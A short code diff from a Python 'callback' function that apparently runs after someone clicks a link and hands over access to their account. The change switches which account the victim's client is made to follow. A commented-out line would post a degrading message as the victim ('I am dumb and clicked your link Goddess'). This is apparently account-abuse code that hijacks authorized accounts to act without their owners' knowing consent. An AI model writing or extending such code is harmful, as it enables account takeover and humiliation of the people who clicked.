@@ -277,7 +277,7 @@ def callback():
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         '''
         try:
-            follow(real_client,"PrincessMeimina")
+            follow(real_client,"puppy4meimina")
         except Exception as e:
             print(e)
             return str(e)
